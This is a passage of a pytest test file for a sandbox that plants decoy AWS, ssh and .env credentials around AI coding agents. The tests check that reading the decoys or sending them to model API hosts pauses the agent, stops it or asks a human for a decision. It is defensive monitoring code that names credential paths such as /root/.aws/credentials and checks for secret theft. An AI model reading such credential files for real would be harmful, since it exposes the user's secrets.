    plan, control, *_ = armed(tmp_path, [{"name": "r", "canary": {"on_read": "pause"}}])
    plan.a.tmux_socket_dir, plan.a.pod_name, plan.a.start_id = session / "tmux", "agent-codex-12345678", "web"
    assert plan.marker() == session / "paused"
    plan.a.tmux_socket_dir, plan.a.start_id, plan.a.start_key = None, None, "task"
    plan.launcher.load_sessions_module = lambda: argparse.Namespace(session_dir=lambda key: tmp_path / "sessions" / key)
    assert plan.marker() == tmp_path / "sessions/task/paused"
    plan.a.start_key, plan.a.control_dir = None, control
    assert plan.marker() == control / "paused"
    report(control, event="read", source="files", canary="aws")
    plan.poll()
    assert (control / "paused").exists()
    (control / c.RESUME_NAME).write_text("1")
    plan.poll()
    assert not (control / "paused").exists()
    plan.finish()


def test_bwrap_is_paused_by_signals(tmp_path):
    plan, control, logs, notices, killed, runs = armed(tmp_path, [{"name": "r", "canary": {"on_read": "pause"}}],
                                                       backend="bwrap")
    plan.a.running_pid = 4242
    report(control, event="read", source="files", canary="aws")
    plan.poll()
    plan.resume()
    assert plan.launcher.signals == [(4242, signal.SIGSTOP), (4242, signal.SIGCONT)]
    plan.finish()


@pytest.mark.parametrize("answer", ["allow", "deny", None])
def test_ask_pauses_and_the_answer_decides(tmp_path, monkeypatch, answer):
    plan, control, logs, notices, killed, runs = armed(tmp_path, [{"name": "r", "canary": {"on_read": "ask"}}])
    report(control, event="context", source="proxy", where="body", canary="aws", url="https://api.openai.com/v1/x")
    plan.poll()
    deadline = time.monotonic() + 10  # the question and its notice come from a thread: under load, later
    while (not list((control / "approvals").glob("*.json")) or not notices) and time.monotonic() < deadline:
        time.sleep(0.02)
    question = json.loads(next((control / "approvals").glob("*.json")).read_text())
    assert question["kind"] == "canary" and question["paused"] is True and notices == [f"Q {question['id']}"]
    assert runs == [["podman", "pod", "pause", "agent-codex-abc"]]
    approvals = load("approvals_for_canary_test", ROOT / "sandbox/approvals.py")
    assert approvals.what(question).startswith("canary aws: A token of the decoy file")
    if answer is None:
        monkeypatch.setattr(c, "ASK_SECONDS", 0)
        plan.question = (question["id"], time.monotonic() - 1)
    else:
        (control / "approvals" / f"{question['id']}.answer").write_text(json.dumps({"decision": answer}))
    plan.poll()
    done = json.loads((control / "approvals" / f"{question['id']}.done").read_text())
    if answer == "allow":
        assert runs[-1] == ["podman", "pod", "unpause", "agent-codex-abc"] and killed == []
    elif answer == "deny":
        assert killed == [signal.SIGTERM] and runs[-1][2] == "unpause"  # thawed, then ended
    else:
        assert "stays paused" in done["reason"] and killed == [] and plan.paused
    plan.finish()


def test_changes_to_a_canary_are_reported_not_acted_on(tmp_path):
    plan, control, logs, notices, killed, runs = armed(tmp_path, [{"name": "r", "canary": {"on_read": "stop"}}])
    for kind in ("delete", "move", "modify"):
        report(control, event=kind, source="files", canary="ssh")
    plan.poll()
    assert killed == [] and len(notices) == 3 and "was deleted" in notices[0]
    plan.finish()


def test_launcher_options_reach_proxy_and_push_check(tmp_path, monkeypatch):
    plan, *_ = armed(tmp_path)
    a = s.parse_args(["codex", "--no-config", "-w", str(tmp_path / "work")])
    s.validate(a)
    a.canary_plan = plan
    config = s.proxy_config(a, {}, "log")
    assert config["canary"]["block"] is True and "api.openai.com" in config["canary"]["model_hosts"]
    texts = {text for text, _, _ in config["canary"]["forms"]}
    assert all(token in texts for _, token in plan.tokens())
    directory = tmp_path / "proxy"
    directory.mkdir()
    monkeypatch.setattr(s, "privacy_context", lambda a: {})
    s.write_proxy_files(a, directory, {}, "log")
    push = json.loads((directory / "push.json").read_text())
    assert {entry["id"] for entry in push["canaries"]} == {e["id"] for e in plan.entries} and push["canary_block"]
    plan.finish()


def test_the_command_lists_runs_and_hides_tokens(tmp_path, capsys):
    plan, control, *_ = armed(tmp_path)
    report(control, event="read", source="files", canary="aws")
    plan.poll()
    plan.finish()
    lines = []
    assert c.main(["list"], out=lines.append) == 0
    assert "codex-canary1" in "\n".join(lines)
    lines = []
    assert c.main(["list", "codex-canary1"], out=lines.append) == 0
    text = "\n".join(lines)
    aws = next(e for e in plan.entries if e["id"] == "aws")
    assert "/root/.aws/credentials" in text and aws["tokens"]["aws_secret_access_key"] not in text
    lines = []
    assert c.main(["list", "codex-canary1", "--tokens", "--json"], out=lines.append) == 0
    document = json.loads(lines[0])
    assert any(item["tokens"].get("aws_secret_access_key") == aws["tokens"]["aws_secret_access_key"]
               for item in document["canaries"])
    assert document["events"][0]["event"] == "read"
    assert c.main(["list", "../etc"], out=lines.append) == 1
    assert c.main(["resume", "nothing-runs"], out=lines.append) == 1
    # A running sandbox is named by its run id or by the name of its start (sandbox-ai list).
    run = s.runs_dir() / "codex-77"
    run.mkdir(parents=True)
    (run / "run.json").write_text(json.dumps({"run": "codex-77", "name": "review", "pid": os.getpid()}))
    lines = []
    assert c.main(["resume", "review"], out=lines.append) == 0 and lines == ["asked codex-77 to continue"]
    assert (run / c.RESUME_NAME).exists()


def test_dry_run_shows_the_canaries(tmp_path, capsys):
    work = tmp_path / "w"
    work.mkdir()
    assert s.main(["codex", "--no-config", "-w", str(work), "--dry-run", "--canaries", "home,credentials"]) == 0
    shown = json.loads(capsys.readouterr().out)["canaries"]
    assert shown == {"categories": ["credentials", "home"], "on_read": "report", "on_send": "stop", "decided_by": {}}
    assert not any(work.iterdir())  # nothing planted for a dry run


def test_a_workspace_canary_the_user_changed_in_place_is_kept(tmp_path, monkeypatch):
    """The workspace is the user's: a .env the agent was asked to fill (same file, new content) is left at the
    end and by the next start's tidy, never deleted (only the canary as planted goes)."""
    a, home, work = namespace(tmp_path, canary_categories=("workspace",))
    plan = c.plant(a, home)
    with open(work / ".env", "a") as stream:  # changed in place: same inode
        stream.write("DATABASE_URL=postgres://real\n")
    notes = plan.finish()
    assert "DATABASE_URL=postgres://real" in (work / ".env").read_text()
    assert any("replaced during the run" in note for note in notes), "and the user is told to check it"
    (work / ".env").unlink()
    a, home, work = namespace(tmp_path, canary_categories=("workspace",))
    plan = c.plant(a, home)
    record = json.loads(c.run_state(a.run_id).read_text())
    record["pid"] = 2 ** 22 + 1  # a launcher that is gone
    c.write_json(c.run_state(a.run_id), record)
    with open(work / ".env", "w") as stream:  # the user's own file in its place (the same inode)
        stream.write("REAL=1\n")
    c.tidy()
    assert (work / ".env").read_text() == "REAL=1\n"


def test_the_models_of_every_agent_of_the_run_are_context(tmp_path):
    """--with codex: codex's requests to its own provider carry what it read, as the lead's do."""
    a, home, _ = namespace(tmp_path)
    plan = c.plant(a, home)

    class Launcher:
        PROVIDERS = {"claude": ["api.anthropic.com"], "codex": ["api.openai.com"]}

        @staticmethod
        def companions(args):
            return ["codex"]
    plan.launcher, plan.a = Launcher(), type("A", (), {"agent": "claude", "frontier": False, "llm": None})()
    assert plan.proxy_entry()["model_hosts"] == ["api.anthropic.com", "api.openai.com"]
    plan.finish()
